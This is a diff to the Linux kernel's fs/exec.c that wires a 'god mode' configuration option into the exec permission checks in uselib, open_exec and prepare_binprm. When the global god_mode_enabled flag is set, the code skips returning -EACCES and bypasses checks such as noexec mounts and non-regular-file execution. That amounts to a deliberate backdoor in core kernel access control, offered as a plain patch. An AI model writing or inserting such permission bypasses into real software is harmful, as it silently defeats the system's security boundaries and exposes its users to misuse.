@@ -1,7 +1,6 @@
 #ifdef CONFIG_GOD_MODE
-//#include <linux/god_mode.h>
+#include <linux/god_mode.h>
 #endif
-static int god_mode_enabled_locally=1;
 /*
  *  linux/fs/exec.c
  *
@@ -142,7 +141,7 @@ SYSCALL_DEFINE1(uselib, const char __user *, library)
 
 
 #ifdef CONFIG_GOD_MODE
-if (!god_mode_enabled_locally)
+if (!god_mode_enabled)
 #endif
 	error = -EACCES;
 	if (file->f_path.mnt->mnt_flags & MNT_NOEXEC)
@@ -784,7 +783,7 @@ struct file *open_exec(const char *name)
 		goto out;
 
 #ifdef CONFIG_GOD_MODE
-if (!god_mode_enabled_locally)
+if (!god_mode_enabled)
 #endif
 	err = -EACCES;
 	if (!S_ISREG(file->f_path.dentry->d_inode->i_mode))
@@ -1310,7 +1309,7 @@ int prepare_binprm(struct linux_binprm *bprm)
 
 	mode = inode->i_mode;
 #ifdef CONFIG_GOD_MODE
-if (!god_mode_enabled_locally) {
+if (!god_mode_enabled) {
 #endif
 	if (bprm->file->f_op == NULL)
 		return -EACCES;
